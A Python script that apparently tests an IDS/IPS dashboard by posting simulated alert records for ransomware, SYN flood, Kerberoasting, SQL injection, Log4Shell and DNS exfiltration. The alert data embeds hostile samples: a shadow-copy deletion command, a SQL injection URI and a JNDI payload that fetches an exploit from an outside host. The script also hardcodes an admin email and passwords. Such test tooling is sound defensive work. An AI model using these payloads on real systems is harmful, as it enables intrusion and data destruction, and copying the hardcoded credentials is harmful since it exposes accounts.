#!/usr/bin/env python3
"""
Enterprise IDS/IPS Attack Simulation Script
Simulates realistic cyber attacks against the platform to test:
1. Real-time alert ingestion (Kafka / REST)
2. Live WebSocket alerts streaming to Dashboard UI
3. Automated Incident creation
4. Automated IPS IP blocking enforcement
"""

import os
import sys
import time
import json
import urllib.request
import urllib.parse
from datetime import datetime

API_BASE = "http://localhost:8000"

ATTACK_SCENARIOS = [
    {
        "name": "[1. MALWARE] LockBit 3.0 Ransomware Shadow Copy Wiping",
        "description": "Mass file encryption & vssadmin shadow copy deletion command",
        "src_ip": "198.51.100.22",
        "src_port": 54100,
        "dst_ip": "10.240.20.88",
        "dst_port": 445,
        "protocol": "SMB",
        "signature": "Win32.Ransomware.LockBit3.0 Volume Shadow Deletion via vssadmin",
        "category": "malware",
        "severity": "CRITICAL",
        "risk_score": 99,
        "raw_event": {"command": "vssadmin.exe delete shadows /all /quiet", "target": "DC01"}
    },
    {
        "name": "[2. NETWORK] Mirai Distributed TCP SYN Flood DDoS",
        "description": "Volumetric SYN flood packet burst inundating edge gateway",
        "src_ip": "194.26.29.112",
        "src_port": 38910,
        "dst_ip": "10.240.0.1",
        "dst_port": 80,
        "protocol": "TCP",
        "signature": "Mirai IoT SYN Flood Distributed Denial of Service (> 1.2M pps)",
        "category": "network",
        "severity": "CRITICAL",
        "risk_score": 94,
        "raw_event": {"pps": 1200000, "flag": "SYN"}
    },
    {
        "name": "[3. CREDENTIAL] Active Directory Kerberoasting Ticket Theft",
        "description": "RC4-HMAC downgraded TGS ticket request for offline hash cracking",
        "src_ip": "10.240.15.44",
        "src_port": 51102,
        "dst_ip": "10.240.10.4",
        "dst_port": 88,
        "protocol": "Kerberos",
        "signature": "Kerberoasting Active Directory Ticket Request (RC4-HMAC downgrade)",
        "category": "credential",
        "severity": "HIGH",
        "risk_score": 94,
        "raw_event": {"spn": "MSSQLSvc/db-vault.prod:1433", "encryption": "rc4-hmac"}
    },
    {
        "name": "[4. WEB/API] SQL Injection Union Select Database Extraction",
        "description": "Malicious payload injection attempting database extraction via HTTP GET",
        "src_ip": "198.51.100.99",
        "src_port": 49182,
        "dst_ip": "10.240.10.12",
        "dst_port": 443,
        "protocol": "HTTPS",
        "signature": "ET WEB_SPECIFIC_APPS SQL Injection in URI parameter 'id=1 UNION SELECT * FROM users'",
        "category": "web_api",
        "severity": "CRITICAL",
        "risk_score": 98,
        "raw_event": {
            "uri": "/api/v1/customers?id=1%20UNION%20SELECT%20username,password%20FROM%20users--",
            "method": "GET",
            "user_agent": "sqlmap/1.7.2#stable"
        }
    },
    {
        "name": "[5. EXPLOITATION] Apache Log4Shell JNDI Remote Code Execution",
        "description": "Zero-day JNDI lookup remote Java bytecode execution",
        "src_ip": "185.220.101.5",
        "src_port": 49152,
        "dst_ip": "10.240.10.12",
        "dst_port": 443,
        "protocol": "HTTPS",
        "signature": "ET EXPLOIT Apache Log4j JNDI RCE (CVE-2021-44228)",
        "category": "exploitation",
        "severity": "CRITICAL",
        "risk_score": 98,
        "raw_event": {"jndi_payload": "${jndi:ldap://185.220.101.5:1389/Exploit}", "cve": "CVE-2021-44228"}
    },
    {
        "name": "[6. POST-COMPROMISE] DNS Tunneling Data Exfiltration",
        "description": "Base64 chunked database dump exfiltration over DNS TXT queries",
        "src_ip": "10.240.20.88",
        "src_port": 53000,
        "dst_ip": "45.33.32.10",
        "dst_port": 53,
        "protocol": "DNS",
        "signature": "ET POST_COMPROMISE Data Exfiltration Over DNS Tunnel (Base64 Chunked)",
        "category": "post_compromise",
        "severity": "CRITICAL",
        "risk_score": 97,
        "raw_event": {"bytes_exfiltrated": 15400000, "domain": "exfil.attacker-dns.org"}
    }
]

ADMIN_EMAIL = os.getenv("ADMIN_EMAIL", "krrish183224@gmail.com")
ADMIN_PASSWORD = os.getenv("ADMIN_PASSWORD", "Apex@Sentinel2024!")

def login():
    passwords_to_try = [ADMIN_PASSWORD, "Apex@Sentinel2024!", "183@Krrish"]
    last_err = None
    for pw in passwords_to_try:
        try:
            data = urllib.parse.urlencode({
                "username": ADMIN_EMAIL,
                "password": pw
            }).encode()
            req = urllib.request.Request(
                f"{API_BASE}/api/auth/login",
                data=data,
                headers={"Content-Type": "application/x-www-form-urlencoded"}
            )
            with urllib.request.urlopen(req) as res:
                token = json.loads(res.read().decode())["access_token"]
                return token
        except Exception as e:
            last_err = e
            continue
    raise Exception(f"Authentication failed: {last_err}")

def send_attack(token, attack):
    print(f"\n>> Launching: {attack['name']}")
    print(f"   Target: {attack['dst_ip']}:{attack['dst_port']} from Attacker IP: {attack['src_ip']}")
    print(f"   Severity: {attack['severity']} | Risk Score: {attack['risk_score']}/100")
    print(f"   Signature: {attack['signature']}")

    payload = {
        "src_ip": attack["src_ip"],
        "src_port": attack["src_port"],
        "dst_ip": attack["dst_ip"],
        "dst_port": attack["dst_port"],
        "protocol": attack["protocol"],
        "signature": attack["signature"],
        "category": attack["category"],
        "severity": attack["severity"],
        "risk_score": attack["risk_score"],
        "status": "OPEN",
        "raw_event": attack["raw_event"]
    }

    req = urllib.request.Request(
        f"{API_BASE}/api/alerts",
        data=json.dumps(payload).encode(),
        headers={
            "Content-Type": "application/json",
            "Authorization": f"Bearer {token}"
        }
    )

    try:
        with urllib.request.urlopen(req) as res:
            res_data = json.loads(res.read().decode())
            print(f"   [OK] Alert Ingested Successfully! ID: {res_data['alert']['id']}")
            print("   [LIVE] Broadcasted via Redis to Dashboard Live Feed!")
    except Exception as e:
        print(f"   [ERR] Ingestion error: {e}")

    # If critical risk, trigger automated IPS block enforcement
    if attack["risk_score"] >= 90:
        print(f"   [IPS] Automated IPS Trigger: Enforcing Firewall Ban on {attack['src_ip']}...")
        block_payload = {
            "ip_address": attack["src_ip"],
            "reason": f"Automated IPS Block: {attack['signature']}",
            "duration_minutes": 120
        }
        block_req = urllib.request.Request(
            f"{API_BASE}/api/ips-actions",
            data=json.dumps(block_payload).encode(),
            headers={
                "Content-Type": "application/json",
                "Authorization": f"Bearer {token}"
            }
        )
        try:
            with urllib.request.urlopen(block_req) as b_res:
                print(f"   [BLOCKED] IPS Action Confirmed: {attack['src_ip']} added to blocked list!")
        except Exception as be:
            print(f"   [NOTE] IPS block note: {be}")

    # ── AI/ML Threat Evaluation & Next Stage Forecast ─────────────────────────
    print("   [AI] Running Real-Time Multi-Vector Neural Threat Evaluation...")
    ai_payload = {
        "src_ip": attack["src_ip"],
        "dst_ip": attack["dst_ip"],
        "dst_port": attack["dst_port"],
        "protocol": attack["protocol"],
        "signature": attack["signature"],
        "category": attack["category"],
        "severity": attack["severity"],
        "risk_score": attack["risk_score"],
        "raw_event": attack["raw_event"],
    }
    ai_req = urllib.request.Request(
        f"{API_BASE}/api/ai/predict",
        data=json.dumps(ai_payload).encode(),
        headers={
            "Content-Type": "application/json",
            "Authorization": f"Bearer {token}"
        }
    )
    try:
        with urllib.request.urlopen(ai_req) as ai_res:
            ai_data = json.loads(ai_res.read().decode())
            conf = ai_data.get("confidence_percentage") or int(ai_data.get("confidence", 0.85) * 100)
            family = ai_data.get("attack_family", "ANOMALY")
            score = ai_data.get("anomaly_score", 0.0)
            next_stg = ai_data.get("predicted_next_stage") or ai_data.get("next_stage_forecast", "Stage 2: Active Investigation")
            rec = ai_data.get("recommended_action", "MONITOR")
            print(f"   [AI INFERENCE] Classified Family : {family} (Confidence: {conf}%)")
            print(f"   [AI INFERENCE] Anomaly Score    : {score:.2f} / 1.00")
            print(f"   [AI FORECAST]  Predicted Next  : {next_stg}")
            print(f"   [AI DIRECTIVE] Recommended Plan : {rec}")

            # If AI requires automated machine isolation:
            if ai_data.get("auto_isolation_required"):
                target_host = ai_data.get("compromised_host_ip", attack["dst_ip"])
                print(f"   [AI QUARANTINE] Target host {target_host} flagged for network isolation!")
                _trigger_host_isolation(token, target_host)
    except Exception as ae:
        print(f"   [AI ERROR] Threat prediction note: {ae}")

def _trigger_host_isolation(token, host_ip):
    # Fetch sensor list to find matching host
    sensors_req = urllib.request.Request(
        f"{API_BASE}/api/sensors",
        headers={"Authorization": f"Bearer {token}"}
    )
    try:
        with urllib.request.urlopen(sensors_req) as s_res:
            res_data = json.loads(s_res.read().decode())
            sensors = res_data.get("items", res_data if isinstance(res_data, list) else [])
            target_sensor = None
            for s in sensors:
                if s.get("ip_address") == host_ip or s.get("hostname") in ("edge-bastion-01", "sensor-01"):
                    target_sensor = s
                    break

            if not target_sensor and sensors:
                target_sensor = sensors[0]

            if target_sensor:
                s_id = target_sensor["id"]
                iso_req = urllib.request.Request(
                    f"{API_BASE}/api/sensors/{s_id}/isolate",
                    data=b"{}",
                    headers={
                        "Content-Type": "application/json",
                        "Authorization": f"Bearer {token}"
                    }
                )
                with urllib.request.urlopen(iso_req) as iso_res:
                    res_j = json.loads(iso_res.read().decode())
                    print(f"   [QUARANTINE SUCCESS] Host '{target_sensor['hostname']}' ({target_sensor['ip_address']}) ISOLATED from network!")
    except Exception as e:
        print(f"   [QUARANTINE NOTE] Sensor isolation note: {e}")

def main():
    print("=" * 65)
    print("ENTERPRISE IDS/IPS LIVE ATTACK SIMULATOR & AI DEFENSE")
    print("=" * 65)
    print(f"Connecting to IDS/IPS Platform at {API_BASE}...")

    try:
        token = login()
        print("Authenticated with System Administrator credentials.")
    except Exception as e:
        print(f"Authentication failed: {e}")
        sys.exit(1)

    print("\nStarting attack scenario simulation...")
    print("Keep your dashboard open at http://localhost:3000 to watch live alerts stream in!\n")

    for i, attack in enumerate(ATTACK_SCENARIOS, 1):
        print(f"--- [Attack Scenario {i} of {len(ATTACK_SCENARIOS)}] ---")
        send_attack(token, attack)
        if i < len(ATTACK_SCENARIOS):
            print("\nWaiting 2 seconds before next attack sequence...")
            time.sleep(2)

    # Fetch final AI Global Forecast
    try:
        print("\n" + "=" * 65)
        print("FETCHING AI/ML GLOBAL THREAT POSTURE FORECAST...")
        f_req = urllib.request.Request(
            f"{API_BASE}/api/ai/forecast",
            headers={"Authorization": f"Bearer {token}"}
        )
        with urllib.request.urlopen(f_req) as f_res:
            forecast = json.loads(f_res.read().decode())
            print(f"Global AI Threat Level   : {forecast['global_ai_threat_level']}")
            print(f"Average Anomaly Score    : {forecast['average_anomaly_score']}")
            print(f"Isolated Machines Count  : {forecast['isolated_machines_count']}")
            print(f"Recommendation           : {forecast['recommendation']}")
    except Exception as e:
        print(f"Forecast error: {e}")

    print("\n" + "=" * 65)
    print("ATTACK SIMULATION & AI DEFENSE WORKFLOW COMPLETED!")
    print("Check your dashboard views:")
    print(" - Security Operations Dashboard: http://localhost:3000")
    print(" - Monitored Endpoints & Sensors: http://localhost:3000/sensors")
    print(" - Real-time Threat Alerts:       http://localhost:3000/alerts")
    print(" - Security Incidents:            http://localhost:3000/incidents")
    print(" - IPS Firewall Active Blocks:    http://localhost:3000/ips-actions")
    print(" - Compliance & Forensic Logs:    http://localhost:3000/audit-logs")
    print("=" * 65)

if __name__ == "__main__":
    main()
